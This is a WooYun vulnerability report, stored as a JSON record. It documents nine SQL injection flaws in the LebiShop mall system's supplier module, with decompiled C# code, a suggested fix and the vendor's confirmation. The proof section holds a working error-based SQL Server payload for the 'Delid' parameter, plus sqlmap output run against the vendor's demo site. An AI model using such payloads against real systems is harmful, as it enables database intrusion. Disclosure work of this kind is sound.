{"id": 39926, "wybug_id": "wooyun-2015-092914", "wybug_title": "LebiShop商城系统最新版九处SQL注入四", "wybug_corp": "www.lebi.cn", "wybug_author": "xfkxfk", "wybug_date": "2015-01-23 15:33", "wybug_open_date": "2015-04-23 15:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-23：\t细节向公众公开  简要描述： LebiShop商城系统最新版九处SQL注入四 详细说明：  LebiShop商城系统最新版九处SQL注入因为这里是在商家模块，所以官方demo演示地址为：\nhttp://plus.demo.lebi.cn\n注册并登陆普通用户后，才有申请注册商家用户的功能，这里的商家注册功能是默认开发注册的所以我们注册普通用户shoptest，然后申请注册商家用户即可此时shoptest用户及时普通用户也是商家用户下面来看看申请注册商家用户后的SQL注入漏洞第一处SQL注入漏洞Shop.supplier.ajax目录下的ajax_product.aspx文件首先看看Ask_Del方法：\n// Shop.supplier.Ajax.Ajax_productpublic void Ask_Del(){\tif (!base.Power(\"supplier_ask_del\", \"删除商品咨询\"))\t{\t\tbase.AjaxNoPower();\t\treturn;\t}\tstring id = RequestTool.RequestString(\"Delid\");\tif (id == \"\")\t{\t\tbase.Response.Write(\"{\\\"msg\\\":\\\"\" + base.Tag(\"请选择要删除的信息\") + \"\\\"}\");\t\treturn;\t}\tB_Lebi_Comment.Delete(\"Parentid in (\" + id + \")\");\tB_Lebi_Comment.Delete(\"id in (\" + id + \")\");\tLog.Add(\"删除商品咨询\", \"Comment\", id.ToString(), this.CurrentSupplier, id.ToString());\tbase.Response.Write(\"{\\\"msg\\\":\\\"OK\\\"}\");}\n参数id通过RequestTool.RequestString(\"Delid\");获取然后进入delete方法的in条件sql语句中因为在RequestString中只处理了单引号，但是在in条件中没有引号保护，导致sql注入产生第二处SQL注入\n// Shop.supplier.Ajax.Ajax_productpublic void Comment_Del(){\tif (!base.Power(\"supplier_comment_del\", \"删除商品评价\"))\t{\t\tbase.AjaxNoPower();\t\treturn;\t}\tstring id = RequestTool.RequestString(\"Delid\");\tif (id == \"\")\t{\t\tbase.Response.Write(\"{\\\"msg\\\":\\\"\" + base.Tag(\"请选择要删除的信息\") + \"\\\"}\");\t\treturn;\t}\tB_Lebi_Comment.Delete(\"Parentid in (\" + id + \")\");\tB_Lebi_Comment.Delete(\"id in (\" + id + \")\");\tLog.Add(\"删除商品评价\", \"Comment\", id.ToString(), this.CurrentSupplier, id.ToString());\tbase.Response.Write(\"{\\\"msg\\\":\\\"OK\\\"}\");}\nSQL注入原因同第一处SQL注入原因第三处SQL注入\n// Shop.supplier.Ajax.Ajax_productpublic void Comment_Update(){\tif (!base.Power(\"supplier_comment_edit\", \"编辑商品评价\"))\t{\t\tbase.AjaxNoPower();\t\treturn;\t}\tstring ids = RequestTool.RequestString(\"IDS\");\tList<Lebi_Comment> models = B_Lebi_Comment.GetList(\"id in (\" + ids + \")\", \"\");\nSQL注入原因同第一处SQL注入原因，ids进入GetList方法的in条件sql语句，无单引号第四处SQL注入\n// Shop.supplier.Ajax.Ajax_productpublic void Product_Batch_Update(){\tif (!base.Power(\"supplier_product_batch_edit\", \"批量编辑\"))\t{\t\tbase.AjaxNoPower();\t\treturn;\t}\tstring ids = RequestTool.RequestString(\"IDS\");\tList<Lebi_Product> models = B_Lebi_Product.GetList(\"id in (\" + ids + \")\", \"\");\nSQL注入原因同上第五处SQL注入\n// Shop.supplier.Ajax.Ajax_productpublic void Product_Del(){\tif (!base.Power(\"supplier_product_del\", \"删除商品\"))\t{\t\tbase.AjaxNoPower();\t\treturn;\t}\tstring id = RequestTool.RequestString(\"sonproductid\");\tif (id == \"\")\t{\t\tbase.Response.Write(\"{\\\"msg\\\":\\\"\" + base.Tag(\"请选择要删除的信息\") + \"\\\"}\");\t\treturn;\t}\tList<Lebi_Product> pros = B_Lebi_Product.GetList(\"Product_id in (\" + id + \")\", \"\");\tforeach (Lebi_Product pro in pros)\t{\t\tid = id + \",\" + pro.id;\t}\tImageHelper.LebiImagesDelete(\"product\", id);\tB_Lebi_Product.Delete(\"id in (\" + id + \")\");\tLog.Add(\"删除商品\", \"Product\", id.ToString(), this.CurrentSupplier, id.ToString());\tbase.Response.Write(\"{\\\"msg\\\":\\\"OK\\\"}\");}\nSQL注入原因同上这里存在多处SQL注入问题，在GetList，LebiImagesDelete，Delete方法中都存在sql注入问题第六处SQL注入\n// Shop.supplier.Ajax.Ajax_productpublic void Product_Image_Edit_muti(){\tif (!base.Power(\"supplier_product_edit\", \"编辑商品\"))\t{\t\tbase.AjaxNoPower();\t\treturn;\t}\tstring ids = RequestTool.RequestString(\"ids\");\tstring imagesmall = RequestTool.RequestString(\"smalliamge\");\tstring images = RequestTool.RequestString(\"images\");\tList<Lebi_Product> models = B_Lebi_Product.GetList(\"id in (\" + ids + \")\", \"\");\nSQL注入原因同上第七处SQL注入\n// Shop.supplier.Ajax.Ajax_productpublic void Product_Status_Edit_muti(){\tif (!base.Power(\"supplier_product_edit\", \"编辑商品\"))\t{\t\tbase.AjaxNoPower();\t\treturn;\t}\tint status = RequestTool.RequestInt(\"status\", 0);\tstring ids = RequestTool.RequestString(\"sonproductid\");\tif (ids == \"\")\t{\t\tbase.Response.Write(\"{\\\"msg\\\":\\\"\" + base.Tag(\"请选择要修改的商品\") + \"\\\"}\");\t\treturn;\t}\tstatus = ((status == 1) ? 101 : 100);\tif (this.CurrentSupplierGroup.IsSubmit == 0)\t{\t\tstatus = 100;\t}\tList<Lebi_Product> models = B_Lebi_Product.GetList(\"id in (\" + ids + \")\", \"\");\nSQL注入原因同上第八处SQL注入\n// Shop.supplier.Ajax.Ajax_productpublic void Supplier_ProductType_Edit(){\tif (!base.Power(\"supplier_product_edit\", \"编辑商品\"))\t{\t\tbase.AjaxNoPower();\t\treturn;\t}\tstring ids = RequestTool.RequestString(\"ids\");\tif (ids == \"\")\t{\t\tbase.Response.Write(\"{\\\"msg\\\":\\\"\" + base.Tag(\"请选择要修改的商品\") + \"\\\"}\");\t\treturn;\t}\tList<Lebi_Product> models = B_Lebi_Product.GetList(string.Concat(new object[]\t{\t\t\"Supplier_id = \",\t\tthis.CurrentSupplier.id,\t\t\" and id in (\",\t\tids,\t\t\")\"\t}), \"\");\nSQL注入原因同上第九处SQL注入\n// Shop.supplier.Ajax.Ajax_productpublic void Type_Del(){\tif (!base.Power(\"supplier_pro_type\", \"商品分类\"))\t{\t\tbase.AjaxNoPower();\t}\tstring id = RequestTool.RequestString(\"id\");\tif (id == \"\")\t{\t\tbase.Response.Write(\"{\\\"msg\\\":\\\"\" + base.Tag(\"请选择要删除的信息\") + \"\\\"}\");\t\treturn;\t}\tB_Lebi_Supplier_ProductType.Delete(\"id in (\" + id + \")\");\tImageHelper.LebiImagesDelete(\"supplierproducttype\", id);\tLog.Add(\"删除商品分类\", \"Pro_Type\", id.ToString(), this.CurrentSupplier, id.ToString());\tbase.Response.Write(\"{\\\"msg\\\":\\\"OK\\\"}\");}\nSQL注入原因同上   漏洞证明：  以第一处为例证明官方demo测试报出mssql版本：\n\n报出当前数据库：\n\n使用sqlmap跑一下数据：\n---Place: POSTParameter: Delid    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: Delid=123) AND 3591=CONVERT(INT,(SELECT CHAR(113)+CHAR(115)+CHAR(103)+CHAR(110)+CHAR(113)+(SELECT (CASE WHEN (3591=3591) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(103)+CHAR(118)+CHAR(120)+CHAR(113))) AND (1472=1472---[16:18:35] [INFO] testing Microsoft SQL Server[16:18:35] [INFO] confirming Microsoft SQL Server[16:18:36] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005[16:18:36] [INFO] fetching current database[16:18:36] [INFO] retrieved: db_plusdemolebicncurrent database:    'db_plusdemolebicn'[16:18:36] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 39 times[16:18:36] [INFO] fetched data logged to text files under 'C:\\Users\\user\\Desktop\\sqlmap\\output\\plus.demo.lebi.cn'\n   修复方案：  使用RequestTool.RequestInt(\"xxx\")，或者给变量加单引号保护   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-01-26 15:08 厂商回复： 官方已修复，感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}